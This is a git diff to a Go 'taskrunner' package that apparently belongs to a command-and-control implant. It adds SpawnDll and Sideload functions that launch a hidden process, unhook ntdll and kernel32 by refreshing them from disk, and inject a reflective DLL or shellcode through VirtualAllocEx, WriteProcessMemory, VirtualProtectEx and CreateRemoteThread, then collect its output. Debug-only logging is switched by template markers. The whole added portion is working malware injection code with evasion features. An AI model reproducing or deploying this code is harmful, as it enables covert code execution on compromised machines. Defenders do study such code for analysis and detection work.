@@ -1,3 +1,5 @@
+//+build windows
+
 package taskrunner
 
 /*
@@ -24,6 +26,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+
 	// {{if .Debug}}
 	"log"
 	// {{else}}{{end}}
@@ -123,7 +126,6 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 	}
 	return syscall.Handle(r1), threadID, nil
 }
-
 
 func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
 	var exitCode uint32
@@ -499,4 +501,126 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	log.Println(outStr)
 	// {{end}}
 	return outStr, nil
+}
+
+func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
+	var err error
+	// Hotfix for #114
+	// Somehow this fucks up everything on Windows 8.1
+	// so we're skipping the RefreshPE calls.
+	if version.GetVersion() != "6.3 build 9600" {
+		err = RefreshPE(ntdllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on ntdll failed: %v\n", err)
+			//{{end}}
+			return "", err
+		}
+		err = RefreshPE(kernel32dllPath)
+		if err != nil {
+			//{{if .Debug}}
+			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+			//{{end}}
+			return "", err
+		}
+	}
+	var stdoutBuff bytes.Buffer
+	var stderrBuff bytes.Buffer
+	// 1 - Start process
+	cmd := exec.Command(procName)
+	cmd.Stdout = &stdoutBuff
+	cmd.Stderr = &stderrBuff
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		//{{if .Debug}}
+		HideWindow: false,
+		//{{else}}
+		HideWindow: true,
+		//{{end}}
+	}
+	err = cmd.Start()
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("Could not start process:", procName)
+		//{{end}}
+		return "", err
+	}
+	pid := cmd.Process.Pid
+	// 2 - Inject shellcode
+	// {{if .Debug}}
+	log.Printf("[*] %s started, pid = %d\n", procName, pid)
+	// {{end}}
+	// OpenProcess with PROC_ACCESS_ALL
+	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
+	if err != nil {
+		return "", err
+	}
+	// VirtualAllocEx to allocate a new memory segment into the target process
+	dataAddr, err := virtualAllocEx(handle, 0, uint32(len(data)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+	if err != nil {
+		return "", err
+	}
+	// WriteProcessMemory to write the reflective loader into the process
+	_, err = writeProcessMemory(handle, dataAddr, unsafe.Pointer(&data[0]), uint32(len(data)))
+	if err != nil {
+		return "", err
+	}
+	argAddr := uintptr(0)
+	if len(args) > 0 {
+		// VirtualAllocEx to allocate a new memory segment into the target process
+		argAddr, err = virtualAllocEx(handle, 0, uint32(len(args)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+		if err != nil {
+			return "", err
+		}
+		// WriteProcessMemory to write the reflective loader into the process
+		_, err = writeProcessMemory(handle, argAddr, unsafe.Pointer(&[]byte(args)[0]), uint32(len(args)))
+		if err != nil {
+			return "", err
+		}
+
+	}
+	//{{if .Debug}}
+	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
+	//{{end}}
+	// Apply R-X perms
+	var oldProtect int
+	err = virtualProtectEx(handle, dataAddr, uint(len(data)), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("VirtualProtectEx failed:", err)
+		//{{end}}
+		return "", err
+	}
+	// 3 - Create thread
+	attr := new(syscall.SecurityAttributes)
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(dataAddr)+uintptr(offset), uintptr(argAddr), 0)
+	if err != nil {
+		return "", err
+	}
+	// {{if .Debug}}
+	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
+	// {{end}}
+
+	// 4 - Wait for thread to finish
+	for {
+		code, err := getExitCodeThread(threadHandle)
+		// log.Println(code)
+		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
+			// {{if .Debug}}
+			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
+			// {{end}}
+			return "", err
+		}
+		if code == STILL_ACTIVE {
+			time.Sleep(time.Second)
+		} else {
+			break
+		}
+	}
+	cmd.Process.Kill()
+	return stdoutBuff.String() + stderrBuff.String(), nil
+}
+
+//SideLoad - Side load a binary as shellcode and returns its output
+func Sideload(procName string, data []byte) (string, error) {
+	return SpawnDll(procName, data, 0, "")
 }
